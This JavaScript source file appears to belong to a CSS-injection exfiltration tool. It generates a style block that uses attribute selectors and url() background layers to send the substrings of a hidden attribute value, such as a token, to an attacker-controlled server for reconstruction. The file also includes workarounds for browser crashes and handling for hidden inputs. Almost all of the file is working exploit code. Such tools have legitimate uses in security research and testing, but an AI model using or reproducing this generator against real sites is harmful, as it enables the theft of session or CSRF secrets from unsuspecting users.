// CSS payload generator. Loaded by public/index.html in the browser and
// required by the tests in Node so both exercise the same code.
//
// For every possible hex window of `windowSize` chars, one rule fires a request
// if the attribute contains it. Two smaller rule sets leak the first and last
// ANCHOR_LENGTH chars of the token so the solver knows where it starts and
// ends. Each rule sets its own custom property to a url(), and a single
// `background` lists them all, so every matching rule becomes one request:
//
//   GET /abcd    the attribute contains "abcd"
//   GET /s/ab    the token starts with "ab"
//   GET /e/ab    the token ends with "ab"
(function (root) {
  const HEX = '0123456789abcdef';
  const ANCHOR_LENGTH = 2;
  const MAX_LAYERS_PER_BOX = 25000;
  const PSEUDO_BOXES = ['::before', '::after'];

  function shortName(index) {
    let length = 1;
    while (index >= 26 * 36 ** (length - 1)) {
      index -= 26 * 36 ** (length - 1);
      length++;
    }
    const place = 36 ** (length - 1);
    const first = String.fromCharCode(97 + Math.floor(index / place));
    const rest = length === 1
      ? ''
      : (index % place).toString(36).padStart(length - 1, '0');
    return first + rest;
  }

  function allHex(length) {
    let out = [''];
    for (let i = 0; i < length; i++) out = out.flatMap(p => [...HEX].map(c => p + c));
    return out;
  }

  function generateCSS(cfg, server) {
    const { selector, attribute, tag, startContext, endContext, useStartsWith, useEndsWith } = cfg;
    const windowSize = cfg.windowSize || 4;
    // For hidden inputs the requests are made by the next sibling.
    const target = tag === 'input' ? '+*' : '';
    const rules = [];
    const layers = [];
    const rule = (op, value, prop, path) =>
      rules.push(`&[${attribute}${op}"${value}"]${target}{--${prop}:url(${server}/${path})}`);

    // Start/end props contain a hyphen, so they can never clash with a
    // shortName() (alphanumeric only) used for the window props.
    for (const a of allHex(ANCHOR_LENGTH)) {
      if (useStartsWith) rule('^=', a, 's-', 's/' + a);
      else rule('*=', startContext + a, 's-', 's/' + a);
    }
    allHex(windowSize).forEach((w, i) => {
      const prop = shortName(i);
      rule('*=', w, prop, w);
      layers.push(`var(--${prop},none)`);
    });
    for (const a of allHex(ANCHOR_LENGTH)) {
      if (useEndsWith) rule('$=', a, 'e-', 'e/' + a);
      else rule('*=', a + endContext, 'e-', 'e/' + a);
    }

    // Chrome crashes the tab if one box has too many background layers (seen
    // between 32k and 65k), so spread them over the element and its ::before
    // and ::after. Custom properties are inherited, so the pseudo-elements see
    // the same values.
    const all = ['var(--s-,none)', ...layers, 'var(--e-,none)'];
    const boxCount = Math.ceil(all.length / MAX_LAYERS_PER_BOX);
    const perBox = Math.ceil(all.length / boxCount);
    const host = tag === 'input' ? '&+*' : '&';
    let body = '';
    for (let i = 0; i < boxCount; i++) {
      const background = `background:${all.slice(i * perBox, (i + 1) * perBox).join(',')}`;
      if (i === 0) body += tag === 'input' ? `${host}{display:inline-block;${background}}` : background + ';';
      else body += `${host}${PSEUDO_BOXES[i - 1]}{content:"";display:inline-block;${background}}`;
    }
    return `<style>${selector}{${rules.join('')}${body}}</style>`;
  }

  const api = { HEX, ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES, shortName, allHex, generateCSS };
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else Object.assign(root, api);
})(typeof window !== 'undefined' ? window : globalThis);
